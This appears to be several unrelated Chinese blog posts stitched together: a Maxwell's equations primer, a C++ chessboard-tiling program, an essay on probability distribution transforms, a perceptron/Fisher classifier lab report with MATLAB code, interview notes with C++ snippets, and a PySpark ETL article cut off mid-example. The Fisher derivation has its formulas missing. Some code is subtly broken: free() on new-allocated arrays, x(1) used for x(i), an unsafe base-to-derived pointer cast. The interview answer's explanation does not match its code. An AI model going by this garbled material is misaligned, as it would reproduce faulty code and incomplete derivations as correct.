今后，我们将以麦克斯韦方程组为基础，探讨光波的传播特性。
 







光，是一种电磁波，这是一件多么奇妙的事情，在我们的周围，我们这个世界，整个宇宙，充斥着这种电磁波。光的“波粒二相性”决定了它既具有波的特性，又由粒子组成。组成光的光子，是一种无质量但带有能量的粒子。这种粒子充斥着整个宇宙，被物体吸收或反射，形成万事万物的色彩，进入我们的眼帘，为我们的视觉神经系统所感知，从而在大脑中形成电信号，于是我们又多了一条探索事物的途径。哲学和数学，从思维和形式上描述了了事物的规律，也是我们探索自然和宇宙的有效工具。1864年，33岁的麦克斯韦，提出：“光与磁是同一物质的两种属性，而光是按照电磁定律在电磁场中传播的电磁扰动。”麦克斯韦的物理学思想让宇宙万物展示出它本质的光芒，使得一批又一批的物理学家为之迷思疯狂。麦克斯韦方程组，总结了前人的科学成果，将电磁现象归纳4个线性偏微分方程式。   在说明麦克斯韦方程组之前，我们先回顾一下中学知识：单个正/负电荷Q，释放出的电场，我们可以用如下图所示的电力线表示通过任一封闭曲面的电通量，与该封闭曲面包裹的电荷数成正比空间中一个电荷，在它周围释放出电场，我们可以通过“电力线”来描述电场。用任意封闭曲面包裹住这个电荷，那么不论这个表面如何膨胀或缩小，通过它表面的电力线是一定的。同理，假如这个封闭表面内有多个电荷，那么它们释放出的电力线的叠加，就是通过该曲面的所有电力线，我们叫做通过该曲面上的电通量以下图展示封闭包裹空间V的封闭曲面的一部分磁场在任一表面边缘的环量，和其中穿过的电流强度成正比，同时和该表面电通量的单位时间内的变化成正比。我们可以理解为：电流产生磁场，同时变化的电场也能产生磁场中学时我们学到到电流是自由电荷在导体中的定向移动。著名的安培定律是该方程的一部分，我们知道电流可以在它的周围产生环绕的磁场。而麦克斯韦在安培定律的基础上，发现电场的变化也可以产生磁场。于是就总结有以上公式。以下是某一圆形表面S，其中有在它中间穿越过的电流（我们可以把它想象为导线的横截面）；另外还有穿过该圆形区域的电力线（我们在此以多个点来表示穿越而出的电力线），电力线的总和就是该区域的电通量；电通量单位时间内的变化产生磁场,蓝色部分为磁场在某点处的方向。通过任一封闭曲面的磁通量，为0。因为不存在“磁荷”，不能像电荷一样扩散出电场，所以磁力线是封闭的曲线。即：通过任一封闭曲面的磁力线，有“来”必有“去”，正负抵消，整体通过封闭曲面的磁通量为0。以下是以地球磁场穿越地球表面来说明这一公式的含义。电场在任一表面边缘的环量，等于单位时间内通过该曲面的磁通量变化。我们同样可以把它理解为：变化的磁场产生电场。除去系数，该公式类似于“公式二”中“变化的电场产生磁场”那一部分。以下是通过某一表面的磁通量和其周围的环形电场之间的关系。其实中学我们已经学到过，磁通量的变化使环绕它的导线产生电流，我们现在把导线拿掉，于是它就产生了电场。至此为止，我们简要梳理了麦克斯韦方程组。它们在一定条件下可以解释所有的电磁现象。我们所忽略的几个系数分别什么意义？它们如何影响麦克斯韦方程组发挥其作用？既然光是一种电磁波，那么这些场的变化规律又和具体电磁波有何关系？我们将在以后的探讨中继续。







#include "stdafx.h"

#include<iostream>
#include<iomanip>
using namespace std;

int tile=0;
int *(*board) = NULL;//定义指向指针的指针用于动态的创建用于存储骨牌号的数组

int main()
{
	void chessBoard(int tr, int tc, int dr, int dc, int size);//声明函数
	int tx=0,ty=0,dx,dy,zsize;//定义棋盘的左上角方格、特殊方格的行号和列号以及棋盘大小
	cout<<"请输入特殊方格的行号、列号以及棋盘的大小\n";//其实用户输入
	cin>>dx>>dy>>zsize;
	/*********动态的创建二维数组**********/
	board=new int *[zsize];
	for(int i=0;i<zsize;i++)
	{
		board[i]=new int[zsize];
	}
	/*********动态创建数组结束************/
	board[dx][dy]=0;//特殊方格用0填充
	chessBoard(tx,ty,dx,dy,zsize);
	//输出结果
	for(int j=0;j<zsize;j++)
	{
		for(int m=0;m<zsize;m++)
		{
			cout<<setw(4)<<board[j][m];//用来控制输出间隔
		}
		cout<<endl;
	}


	system("pause");
	free(board);
	board = NULL;
	return 0;
}
void chessBoard(int tr, int tc, int dr, int dc, int size)
{
	if (size == 1) return;
	int t = tile++,  // L型骨牌号
		s = size/2;  // 分割棋盘
	// 覆盖左上角子棋盘
	if (dr < tr + s && dc < tc + s)
		// 特殊方格在此棋盘中
		chessBoard(tr, tc, dr, dc, s);
	else 
	{// 此棋盘中无特殊方格
		// 用 t 号L型骨牌覆盖右下角
		board[tr + s - 1][tc + s - 1] = t;
		// 覆盖其余方格
		chessBoard(tr, tc, tr+s-1, tc+s-1, s);
	}
	// 覆盖右上角子棋盘
	if (dr < tr + s && dc >= tc + s)
		// 特殊方格在此棋盘中
		chessBoard(tr, tc+s, dr, dc, s);
	else 
	{// 此棋盘中无特殊方格
		// 用 t 号L型骨牌覆盖左下角
		board[tr + s - 1][tc + s] = t;
		// 覆盖其余方格
		chessBoard(tr, tc+s, tr+s-1, tc+s, s);
	}
	// 覆盖左下角子棋盘
	if (dr >= tr + s && dc < tc + s)
		// 特殊方格在此棋盘中
		chessBoard(tr+s, tc, dr, dc, s);
	else 
	{// 用 t 号L型骨牌覆盖右上角
		board[tr + s][tc + s - 1] = t;
		// 覆盖其余方格
		chessBoard(tr+s, tc, tr+s, tc+s-1, s);
	}
	// 覆盖右下角子棋盘
	if (dr >= tr + s && dc >= tc + s)
		// 特殊方格在此棋盘中
		chessBoard(tr+s, tc+s, dr, dc, s);
	else
	{// 用 t 号L型骨牌覆盖左上角
		board[tr + s][tc + s] = t;
		// 覆盖其余方格
		chessBoard(tr+s, tc+s, tr+s, tc+s, s);
	}
}

 








作者：黄永刚
前段时间有幸读到了@老师木的文章1,里面在探讨一个问题，为什么在神经网络的节点上面使用的是sigmoid函数？其中谈到一个点：

当知道X的概率密度为f(x)时，什么样的函数h能把x变换成均匀分布的信号？也可以是这样的一道面试题：如何用C的库函数rand()生成服从高斯分布或者β分布，or其他分布的随机数？


上面第一个问题，是将其他分布转换成均匀分布的问题，第二个问题刚好相反。当然有了这个抽象之后，答案很容易上网就能够查到，具体如下[^tjjs]：

用大白话说： 
变量x服从概率密度是f(x)的分布，概率分布函数是F(x)[^gainian],

根据上面的定理1.1-1，如果x服从任意分布，作为自己的累积分布F(x)的输入，则变换后值的分布必将服从U(0,1)即0,1之间的均匀分布。相反如定理1.1-2，假设目标分布的密度函数f(x),求取概率分布F(x)，之后求逆F(x)^-1，然后将R[R~U(0,1),即R服从0,1之间的均匀分布]作为逆函数的输入，变换后值的累积分布将是F(x)函数。
为什么要说这枯燥的数学知识？我们都有一个共识，生活处处存在着概率分布，尤其以钟形曲线的分布为要，其他的分布当然也很多。要想把握事物的内在规律，必须掌握事物的概率分布，之后根据需要对分布进行转化。在老师木的探讨的文章中，需要通过转换放大非长尾数据的作用，进而尽可能使得源信息在数学模型中得到保留。

而且那个文章中也提到一个重要的点，信息熵在均匀分布的时候最大，就对于这种问题，我在找工作的过程中碰到多次，给几组数让选择信息熵最大的那组，很容易知道，越靠近均匀分布熵的值越大。更进一步考虑，如果用熵来描述一个系统的混乱程度，那么当系统的混乱越均匀则熵值越大，类比战国七雄时候最为混乱，毕竟各家的实力相当。在蒙古时期，只有忽必烈部落一家独大，其他部落就是跟着大哥混的，这个时候的混乱程度就低很多，此时熵值就小。
那么这个混乱程度，用在现代生活中，如代码混淆，信息的加密，密码加密等，这些都是想办法怎么来加大其中的混乱程度，进而来增加系统中的信息熵。我们从前文已经知道越靠近均匀分布熵的值越大，因此这些领域我们可以看做是一个概率分布转换的过程。究竟如何在具体的领域中衡量一个系统信息的概率分布并如何构造转换函数，这些领域中大量的牛人肯定能解决这个问题。
上次在知乎看到一个题目，关于密码破译，不知是不是欧阳大神的回答，貌似很像。提到通过截获大量的密文，统计其中字符出现的概率分布，然后对照现实中各个字符出现的概率就能够找到加密字符和真实字符的对应关系。这种情况就属于信息熵较小的情况，很容易被破解，所以现在的加密很难通过统计进行解密。这个过程其实也可视作概率分布的转化。
上面的例子大多是加大系统的熵，然而我们生活中还有很多人的工作是来减小熵，消除不确定性。现在的人工智能的东西，为什么说刚开始的时候是“人工智障”，大家经常听人说是由于缺少数据积累，等到数据积累多了就慢慢的聪明起来了。其中的原理是，在应用刚推出的时候，每种行为策略对于智能应用来说是等可能性的，随着数据的积累，各种策略的分布发生变化，渐渐的形成了优势策略，所以看起来变得智能起来。人们常说推荐系统存在“冷启动”问题，就是由于新来的用户没有数据积累，对于推荐系统来说，不同类别得商品都是等可能的；随着用户的数据积累，逐渐形成了清晰的用户画像，然后根据用户画像进行个性化的推荐，这个时候大家就会感觉到推荐还是挺靠谱得。

还记得上学的时候，大多老师检查家庭作业喜欢每天只检查一组学生，有的老师选择每组按天轮流检查，这样没有轮流到组的学生就不做作业；有的老师是随机选择抽查一组，这样大家怕被抽到时没有完成而受罚，大多同学就会完成作业。对于第一种老师的选择来说，检查作业的分布的不确定性非常的小，结果很多学生没有做作业，所以老师的目的并没有达到，而第二种老师的选择不确定性就很大，所以获得了较好的效果。这其实也是老师和学生博弈的一个过程。聪明老师的选择，在博弈论里面被称作“纳什均衡”，不错就是《美丽心灵》的那个Nash。大家肯定知道经济学同学考研也是要考《概率论》地，所以我们今天所说概率分布的转化不仅仅局限于工程领域。
当然要很好的发现和应用这些知识还需要很多知识的积累，前路漫漫……
推荐大家有空闲的时候好好看看@老师木的文章，【参考文献1】！
愿与诸君共勉！
reference: 
1. 为什么我们喜欢用sigmoid这类S型非线性变换? 
2. 所有的概率分布都可以转化成正态分布吗？ 
3. zhihu:在连续随机变量中，概率密度函数（PDF）、概率分布函数、累积分布函数（CDF）之间的关系是什么？

本文原创首发于公众号：老王和他的IT界朋友们
微信扫描关注微信号：（原创投稿有惊喜！！！）









请参阅 参考1 
[^tjjs]: 高惠璇教授《统计计算》 
[^gainian]:概念不熟悉的可以参阅  参考3 ↩ 






 
一、实验目的和要求 
目的： 
了解线性分类器，对分类器的参数做一定的了解，理解参数设置对算法的影响。
 
要求： 
1. 产生两类样本
2. 采用线性分类器生成出两类样本的分类面
3. 对比线性分类器的性能，对比参数设置的结果
二、实验环境、内容和方法 
环境：windows 7，matlab R2010a
内容：通过实验，对生成的实验数据样本进行分类。
 
三、实验基本原理 
感知器基本原理： 
1.感知器的学习过程是不断改变权向量的输入，更新结构中的可变参数，最后实现在有限次迭代之后的收敛。感知器的基本模型结构如图1所示：

图1 感知器基本模型 
其中，X输入，Xi表示的是第i个输入；Y表示输出；W表示权向量；w0是阈值，f是一个阶跃函数。
感知器实现样本的线性分类主要过程是：特征向量的元素x1，x2，……，xk是网络的输入元素，每一个元素与相应的权wi相乘。，乘积相加后再与阈值w0相加，结果通过f函数执行激活功能，f为系统的激活函数。因为f是一个阶跃函数，故当自变量小于0时，f= -1；当自变量大于0时，f= 1。这样，根据输出信号Y，把相应的特征向量分到为两类。
然而，权向量w并不是一个已知的参数，故感知器算法很重要的一个步骤即是寻找一个合理的决策超平面。故设这个超平面为w，满足：
        （1）
引入一个代价函数，定义为：
        （2）
其中，Y是权向量w定义的超平面错误分类的训练向量的子集。变量定义为：当时，=
 -1；当时，= +1。显然，J(w)≥0。当代价函数J(w)达到最小值0时，所有的训练向量分类都全部正确。为了计算代价函数的最小迭代值，可以采用梯度下降法设计迭代算法，即：
        （3）
其中，w(n)是第n次迭代的权向量，有多种取值方法，在本设计中采用固定非负值。由J(w)的定义，可以进一步简化（3）得到：
        （4）
通过（4）来不断更新w，这种算法就称为感知器算法（perceptron algorithm）。可以证明，这种算法在经过有限次迭代之后是收敛的，也就是说，根据（4）规则修正权向量w，可以让所有的特征向量都正确分类。
 
 
Fisher分类器原理：
Fisher线性判别分析的基本思想：通过寻找一个投影方向（线性变换，线性组合），将高维问题降低到一维问题来解决，并且要求变换后的一维数据具有如下性质：同类样本尽可能聚集在一起，不同类的样本尽可能地远。

Fisher线性判别分析，就是通过给定的训练数据，确定投影方向W和阈值y0，即确定线性判别函数，然后根据这个线性判别函数，对测试数据进行测试，得到测试数据的类别。
 
1．线性投影与Fisher准则函数

在两类问题中，假定有个训练样本其中个样本来自类型，个样本来自类型，。两个类型的训练样本分别构成训练样本的子集和。

令：， (4.5-1)

是向量通过变换得到的标量，它是一维的。实际上，对于给定的，就是判决函数的值。

由子集和的样本映射后的两个子集为和。因为我们关心的是的方向，可以令，那么就是在方向上的投影。使和最容易区分开的方向正是区分超平面的法线方向。如下图：


图中画出了直线的两种选择，图(a)中，和还无法分开，而图(b)的选择可以使和区分开来。所以图(b)的方向是一个好的选择。

下面讨论怎样得到最佳方向的解析式。

各类在维特征空间里的样本均值向量：

， (4.5-2)

通过变换映射到一维特征空间后，各类的平均值为：

， (4.5-3)

映射后，各类样本"类内离散度"定义为： 

， (4.5-4)

显然，我们希望在映射之后，两类的平均值之间的距离越大越好，而各类的样本类内离散度越小越好。因此，定义Fisher准则函数：

 (4.5-5)

使最大的解就是最佳解向量，也就是Fisher的线性判别式。

2．求解
从的表达式可知，它并非的显函数，必须进一步变换。

已知：，, 依次代入(4.5-1)和(4.5-2)，有：

， (4.5-6)

所以：
 (4.5-7)

其中： (4.5-8)

是原维特征空间里的样本类内离散度矩阵，表示两类均值向量之间的离散度大小，因此，越大越容易区分。

将(4.5-6)和(4.5-2)代入(4.5-4)式中：



 (4.5-9)

其中：， (4.5-10)

因此： (4.5-11)

显然： (4.5-12)

称为原维特征空间里，样本"类内离散度"矩阵。

是样本"类内总离散度"矩阵。

为了便于分类，显然越小越好，也就是越小越好。

将上述的所有推导结果代入表达式：

 —— 广义Rayleigh商 (4.5-13)

式中和皆可由样本集计算出。

用lagrange乘子法求解的极大值点。

令分母等于非零常数，也就是：。

定义lagrange函数： 

 (4.5-14)

对求偏导数：


令得到：

 (4.5-15)

从上述推导(4.5-10)～(4.5-12)可知，是维特征的样本协方差矩阵，它是对称的和半正定的。当样本数目时，是非奇异的，也就是可求逆。

则： (4.5-16)

问题转化为求一般矩阵的特征值和特征向量。令，则是的特征根，是的特征向量。



 (4.5-17)

式中： 

是一个标量。所以总是在方向上。将(4.5-17)代入到(4.5-15)，可以得到：


其中，是一个比例因子，不影响的方向，可以删除，从而得到最后解：

 (4.5-18)

就使取得最大值，可使样本由维空间向一维空间映射，其投影方向最好。是一个Fisher线性判断式。

讨论： 
如果，，则样本线性不可分。

，未必线性可分。

不可逆，未必不可分。

3.Fisher算法步骤 

由Fisher线性判别式求解向量的步骤：

① 把来自两类的训练样本集分成和两个子集和。

② 由，，计算。

③ 由计算各类的类内离散度矩阵，。

④ 计算类内总离散度矩阵。

⑤ 计算的逆矩阵。

⑥ 由求解。

这一节所研究的问题针对确定性模式分类器的训练，实际上，Fisher的线性判别式对于随机模式也是适用的。

Fisher算法注释: 
（1）Fisher方法可直接求解权向量；

（2）对线性不可分的情况，Fisher方法无法确定分类，Fisher可以进一步推广到多类问题中去。

 
 
四、实验过程描述 
总结：

 
采用感知器算法实现data1.m的数据分类流程如图2所示：

图2 单层感知器算法程序流程 
 
Fisher准则求得分类面的性能好坏一定程度上受样本影响。有的时候Fisher可以完全正确分类，有的时候分类结果虽不是完全正确但尚可以接受，有的时候则很不理想。
 
五、实验结果 
感知器分类结果： 

Fisher线性分类器分类结果： 


六、附录代码
单层感知分类器： 
function Per1()
 
clear
all;
close
all;
 
%样本初始化
x1(1,1)=5.1418; x1(1,2)=0.5950;
x1(2,1)=5.5519; x1(2,2)=3.5091;
x1(3,1)=5.3836; x1(3,2)=2.8033;
x1(4,1)=3.2419; x1(4,2)=3.7278;
x1(5,1)=4.4427; x1(5,2)=3.8981;
x1(6,1)=4.9111; x1(6,2)=2.8710;
x1(7,1)=2.9259; x1(7,2)=3.4879;
x1(8,1)=4.2018; x1(8,2)=2.4973;
x1(9,1)=4.7629; x1(9,2)=2.5163;
x1(10,1)=2.7118; x1(10,2)=2.4264;
x1(11,1)=3.0470; x1(11,2)=1.5699;
x1(12,1)=4.7782; x1(12,2)=3.3504;
x1(13,1)=3.9937; x1(13,2)=4.8529;
x1(14,1)=4.5245; x1(14,2)=2.1322;
x1(15,1)=5.3643; x1(15,2)=2.2477;
x1(16,1)=4.4820; x1(16,2)=4.0843;
x1(17,1)=3.2129; x1(17,2)=3.0592;
x1(18,1)=4.7520; x1(18,2)=5.3119;
x1(19,1)=3.8331; x1(19,2)=0.4484;
x1(20,1)=3.1838; x1(20,2)=1.4494;
x1(21,1)=6.0941; x1(21,2)=1.8544;
x1(22,1)=4.0802; x1(22,2)=6.2646;
x1(23,1)=3.0627; x1(23,2)=3.6474;
x1(24,1)=4.6357; x1(24,2)=2.3344;
x1(25,1)=5.6820; x1(25,2)=3.0450;
x1(26,1)=4.5936; x1(26,2)=2.5265;
x1(27,1)=4.7902; x1(27,2)=4.4668;
x1(28,1)=4.1053; x1(28,2)=3.0274;
x1(29,1)=3.8414; x1(29,2)=4.2269;
x1(30,1)=4.8709; x1(30,2)=4.0535;
x1(31,1)=3.8052; x1(31,2)=2.6531;
x1(32,1)=4.0755; x1(32,2)=2.8295;
x1(33,1)=3.4734; x1(33,2)=3.1919;
x1(34,1)=3.3145; x1(34,2)=1.8009;
x1(35,1)=3.7316; x1(35,2)=2.6421;
x1(36,1)=2.8117; x1(36,2)=2.8658;
x1(37,1)=4.2486; x1(37,2)=1.4651;
x1(38,1)=4.1025; x1(38,2)=4.4063;
x1(39,1)=3.9590; x1(39,2)=1.3024;
x1(40,1)=1.7524; x1(40,2)=1.9339;
x1(41,1)=3.4892; x1(41,2)=1.2457;
x1(42,1)=4.2492; x1(42,2)=4.5982;
x1(43,1)=4.3692; x1(43,2)=1.9794;
x1(44,1)=4.1792; x1(44,2)=0.4113;
x1(45,1)=3.9627; x1(45,2)=4.2198;
 
 
x2(1,1)=9.7302; x2(1,2)=5.5080;
x2(2,1)=8.8067; x2(2,2)=5.1319;
x2(3,1)=8.1664; x2(3,2)=5.2801;
x2(4,1)=6.9686; x2(4,2)=4.0172;
x2(5,1)=7.0973; x2(5,2)=4.0559;
x2(6,1)=9.4755; x2(6,2)=4.9869;
x2(7,1)=9.3809; x2(7,2)=5.3543;
x2(8,1)=7.2704; x2(8,2)=4.1053;
x2(9,1)=8.9674; x2(9,2)=5.8121;
x2(10,1)=8.2606; x2(10,2)=5.1095;
x2(11,1)=7.5518; x2(11,2)=7.7316;
x2(12,1)=7.0016; x2(12,2)=5.4111;
x2(13,1)=8.3442; x2(13,2)=3.6931;
x2(14,1)=5.8173; x2(14,2)=5.3838;
x2(15,1)=6.1123; x2(15,2)=5.4995;
x2(16,1)=10.4188; x2(16,2)=4.4892;
x2(17,1)=7.9136; x2(17,2)=5.2349;
x2(18,1)=11.1547; x2(18,2)=4.4022;
x2(19,1)=7.7080; x2(19,2)=5.0208;
x2(20,1)=8.2079; x2(20,2)=5.4194;
x2(21,1)=9.1078; x2(21,2)=6.1911;
x2(22,1)=7.7857; x2(22,2)=5.7712;
x2(23,1)=7.3740; x2(23,2)=2.3558;
x2(24,1)=9.7184; x2(24,2)=5.2854;
x2(25,1)=6.9559; x2(25,2)=5.8261;
x2(26,1)=8.9691; x2(26,2)=4.9919;
x2(27,1)=7.3872; x2(27,2)=5.8584;
x2(28,1)=8.8922; x2(28,2)=5.7748;
x2(29,1)=9.0175; x2(29,2)=6.3059;
x2(30,1)=7.0041; x2(30,2)=6.2315;
x2(31,1)=8.6396; x2(31,2)=5.9586;
x2(32,1)=9.2394; x2(32,2)=3.3455;
x2(33,1)=6.7376; x2(33,2)=4.0096;
x2(34,1)=8.4345; x2(34,2)=5.6852;
x2(35,1)=7.9559; x2(35,2)=4.0251;
x2(36,1)=6.5268; x2(36,2)=4.3933;
x2(37,1)=7.6699; x2(37,2)=5.6868;
x2(38,1)=7.8075; x2(38,2)=5.0200;
x2(39,1)=6.6997; x2(39,2)=6.0638;
x2(40,1)=5.6549; x2(40,2)=3.6590;
x2(41,1)=6.9086; x2(41,2)=5.4795;
x2(42,1)=7.9933; x2(42,2)=3.3660;
x2(43,1)=5.9318; x2(43,2)=3.5573;
x2(44,1)=9.5157; x2(44,2)=5.2938;
x2(45,1)=7.2795; x2(45,2)=4.8596;
x2(46,1)=5.5233; x2(46,2)=3.8697;
x2(47,1)=8.1331; x2(47,2)=4.7075;
x2(48,1)=9.7851; x2(48,2)=4.4175;
x2(49,1)=8.0636; x2(49,2)=4.1037;
x2(50,1)=8.1944; x2(50,2)=5.2486;
x2(51,1)=7.9677; x2(51,2)=3.5103;
x2(52,1)=8.2083; x2(52,2)=5.3135;
x2(53,1)=9.0586; x2(53,2)=2.9749;
x2(54,1)=8.2188; x2(54,2)=5.5290;
x2(55,1)=8.9064; x2(55,2)=5.3435;
 
 
for i=1:45 r1(i)=x1(i,1);end;
for i=1:45 r2(i)=x1(i,2);end;
for i=1:55 r3(i)=x2(i,1);end;
for i=1:55 r4(i)=x2(i,2);end;
 
figure(1);
%plot(r1,r2,'*',r3,r4,'o');
hold
on;%保持当前的轴和图像不被刷新，在该图上接着绘制下一图
 
plot(r1,r2,'ro',...
'LineWidth',1,...
'MarkerEdgeColor','k',...
'MarkerFaceColor',[1 0 0],...
'MarkerSize',7);
 
plot(r3,r4,'bo',...
'LineWidth',1,...
'MarkerEdgeColor','k',...
'MarkerFaceColor',[0 0 1],...
'MarkerSize',7)

 
 
 
x1(:,3) = 1;% 考虑到不经过原点的超平面，对x进行扩维
x2(:,3) = 1;% 使x'=[x 1]，x为2维的，故加1扩为3维
 
%进行初始化
w = rand(3,1);% 随机给选择向量，生成一个3维列向量
p = 1;
%p0非负正实数
ox1 = -1;% 代价函数中的变量
ox2 = 1;% 当x属于w1时为-1，当x属于w2时为1
s = 1;% 标识符，当s=0时，表示迭代终止
n = 0;% 表示迭代的次数
w1 = [0;0;0];
 
while s
%开始迭代
J = 0;
%假设初始的分类全部正确
j = [0;0;0];
%j=ox*x
for i = 1:45
if (x1(i,:)*w)>0
%查看x1分类是否错误，在x属于w1却被错误分类的情况下，w'x<0
w1 = w;
%分类正确，权向量估计不变
else
%分类错误
j = j + ox1*x1(i,:)';% j=ox*x。进行累积运算
J = J + ox1*x1(i,:)*w;% 感知器代价进行累积运算
end
end
for i = 1:55
if (x2(i,:)*w)<0%查看x2分类是否错误，在x属于w2却被错误分类的情况下，w'x>0
w1 = w;
%分类正确，权向量估计不变
else
%分类错误
j = j + ox2*x2(i,:)';% j=ox*x。进行累积运算
J = J + ox2*x2(i,:)*w;% 感知器代价进行累积运算
end
end
if J==0
%代价为0，即分类均正确
s = 0;
%终止迭代
else
w1 = w - p*j;% w(t+1)=w(t)-p(ox*x)进行迭代
p=p+0.1;% 调整p
n = n+1;
%迭代次数加1
end
w = w1;% 更新权向量估计
end
x = linspace(0,10,5000);% 取5000个x的点作图
y = (-w(1)/w(2))*x-w(3)/w(2);% x*w1+y*w2+w0=0,w=[w1;w2;w0]
plot(x,y,'r');% 用红线画出分界面
disp(n);% 显示迭代的次数
axis([1,12,0,8])% 设定当前图中，x轴范围为1-12，为y轴范围为0-8
end
 
 
 
 
 
 
Fisher分类方法： 
 
clear
clc
 
N=60;
[m1,m2,X1,Y1,X2,Y2]=SampleGen(N);
%样本产生程序
M1=[mean(X1) mean(Y1)]';
%计算均值
M2=[mean(X2) mean(Y2)]';
S1=zeros(2,2);
S2=zeros(2,2);
%save data m1 m2 X1 X2 Y1 Y2
for i=1:length(X1)
%类内离散度计算
S1=S1+(m1(:,i)-M1)*(m1(:,i)-M1)';
end
for i=1:length(X2)
S2=S2+(m2(:,i)-M2)*(m2(:,i)-M2)';
end
Sw=S1+S2;
W=(M1-M2)\Sw;
%分类面法向量计算
w0=[mean([X1 X2]) mean([Y1 Y2])]';
%w0 计算
i=min([X1 X2]):0.001:max([X1 X2]);
U=W*w0/W(2)-W(1)/W(2).*i;
plot(X1,Y1,'.',X2,Y2,'r*',i,U,'K')
legend('w1','w2','fisher')
 
 
样本产生函数： 
 
function [m1,m2,X1,Y1,X2,Y2] = SampleGen(N)
x = randn(1,N);
y = randn(1,N);
 
i1 = 1;
i2 = 1;
 
for i = 1:N
if x(1) < 2*y(i)
X1(i1) = x(i);
Y1(i1) = y(i);
i1 = i1 + 1;
elseif x(i) > 2*y(i)
X2(i2) = x(i)
Y2(i2) = y(i)
i2 = i2 + 1;
end
end
 
plot(X1,Y1,'.');
hold
on;
plot(X2,Y2,'r*');
 
m1 = ones(2,length(X1));
m2 = ones(2,length(X2));
 
for i = 1:length(X1)
m1(1,i) = X1(i);
m1(2,i) = Y1(i);
end
 
for i = 1:length(X2)
m2(1,i) = X2(i);
m2(2,i) = Y2(i);
end
 
end
 
 
 
 
 






 
 
 
 
感谢赛码网，奇怪的A题设计，bat一轮大企业过去，没A上去几道。
intel 笔试：
1.单链表逆置，双向链表删除
2.层次遍历二叉树
3.rand4（）生成rand9（）
4.非常多的各种指针操作。
面试：完全的问项目

1.stl boost c++中的智能指针，以及其实现原理？
2.b 树的插入
3.代码实现stack 的排序，只能用stack 的基本操作
乐港面试：
服务器实时排名？（和完美世界一个样子）
为啥下午5点review code 的问题。

// testofrecursive.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "iostream"
using namespace std;


class A
{
	int a;
	char c;
public:
	void foo(){cout<<"a foo"<<endl;}
	virtual void fool(){cout<<"a fool"<<endl;}
};
class B:public A
{
	int a;
	char c;
public:
	void foo(){cout<<"b foo"<<endl;}
	void fool(){cout<<"b fool"<<endl;}
};


void func(int k)
{
	if (k>0)
	{
		cout<<k;
		func(k-1);
		cout<<endl;
		func(k-1);
		//func(k-1);
	}
}


int _tmain(int argc, _TCHAR* argv[])
{
	func(4);
	int size = sizeof(A);

	A *a = new A;
	B *b = new B;


	b->fool();

	b = (B *)a;
	a->foo();
	b->foo();
	b->fool();
	
	return 0;
}


 

 
完美世界笔试，面试：
1.c++强制类型转换：http://www.cnblogs.com/alexqdh/archive/2011/06/09/2075713.html
2.inline函数优缺点：

面试：滑动窗口，服务器实时排名，为什么想做服务器后台开发？数组中第k大的数，阻塞和非阻塞

研究所：
说说你的规划，走技术路线，成为一个T字形的人才（这个回答应该会能impressive 面试官）

中移动物联网：
1T数据的高效传输方案
兆芯：
 
 
 
 
 
滴滴出行，编程题，要求找到数组中连续和等于0的，最长子数列：
你应该听说过分治法，正是：分而治之。我们有一个很复杂的大问题，很难直接解决它，但是我们发现可以把问题划分成子问题，如果子问题规模还是太大，并且它还可以继续划分，那就继续划分下去。直到这些子问题的规模已经很容易解决了，那么就把所有的子问题都解决，最后把所有的子问题合并，我们就得到复杂大问题的答案了。可能说起来简单，但是仍不知道怎么做，接下来分析这个问题：
首先，我们可以把整个序列平均分成左右两部分，答案则会在以下三种情况中：
1、所求序列完全包含在左半部分的序列中。
2、所求序列完全包含在右半部分的序列中。
3、所求序列刚好横跨分割点，即左右序列各占一部分。
前两种情况和大问题一样，只是规模小了些，如果三个子问题都能解决，那么答案就是三个结果的最大值。我们主要研究一下第三种情况如何解决：
我们只要计算出：以分割点为起点向左的最大连续序列和、以分割点为起点向右的最大连续序列和，这两个结果的和就是第三种情况的答案。因为已知起点，所以这两个结果都能在O(N)的时间复杂度能算出来。
递归不断减小问题的规模，直到序列长度为1的时候，那答案就是序列中那个数字。

// testdidi.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include<iostream>

using namespace std;
int result[10000] = {1,2,3,4,-1,-2,-3,-3,1,2};

int main()
{
	
	
	
	int length = 10;
	int begin = 0;
	int end = 0;
	int max_length = 0;

	int sum = 0;
	for(int i = 0;i <length;++i)
	{
		sum = 0;
		for(int j = i;j <length;++j)
		{
			sum = sum + result[j];
			if ((sum == 0) && (max_length < j-i))
			{
				begin = i;
				end = j;
				max_length = end - begin;
			}

		}
		
	}

		for(int i = begin;i<=end;++i)
		{
			cout<<result[i];
			cout<<' ';
		}
		return 0;
}
 

 
 
﻿﻿ 








文章大纲0.序言1. 数据接入2. 脏数据的清洗2.1 文件转码2.2 指定列名2.3 pyspark dataframe 新增一列并赋值2.4 时间格式处理与正则匹配3. 缺失值的处理4. 数据质量核查与基本的数据统计4.1 统一单位4.1.1 年龄4.1.2 日期4.1.3 数字4.2 去重操作4.3 聚合操作与统计4.4 Top 指标获取5.数据导入导出参考文献大数据ETL 系列文章简介

0.序言
本文主要以基于AWS 搭建的EMR spark 托管集群，使用pandas pyspark 对合作单位的业务数据进行ETL ---- EXTRACT（抽取）、TRANSFORM（转换）、LOAD（加载） 等工作为例介绍大数据数据预处理的实践经验，很多初学的朋友对大数据挖掘，数据分析第一直观的印象，都只是业务模型，以及组成模型背后的各种算法原理。往往忽视了整个业务场景建模过程中，看似最普通，却又最精髓的数据预处理或者叫数据清洗过程。

1. 数据接入
我们经常提到的ETL是将业务系统的数据经过抽取、清洗转换之后加载到数据仓库的过程，首先第一步就是根据不同来源的数据进行数据接入，主要接入方式有三：

1.批量数据
可以考虑采用使用备份数据库导出dmp，通过ftp等多种方式传送，首先接入样本数据，进行分析
2.增量数据
考虑使用ftp，http等服务配合脚本完成
2.实时数据
消息队列接入，kafka，rabbitMQ 等

数据接入对应ETL 中的E----EXTRACT（抽取），接入过程中面临多种数据源，不同格式，不同平台，数据吞吐量，网络带宽等多种挑战。
python 这种胶水语言天然可以对应这类多样性的任务，当然如果不想编程，还有：Talend，Kettle，Informatica，Inaplex Inaport等工具可以使用.

e.g. 一个kettle 的作业流
以上不是本文重点，不同数据源的导入导出可以参考：
数据库，云平台，oracle，aws，es导入导出实战
我们从数据接入以后的内容开始谈起。

2. 脏数据的清洗
比如在使用Oracle等数据库导出csv file时，字段间的分隔符为英文逗号，字段用英文双引号引起来，我们通常使用大数据工具将这些数据加载成表格的形式，pandas ，spark中都叫做dataframe
对与字段中含有逗号，回车等情况，pandas 是完全可以handle 的，spark也可以但是2.2之前和gbk解码共同作用会有bug
数据样例
1,2,3
"a","b,
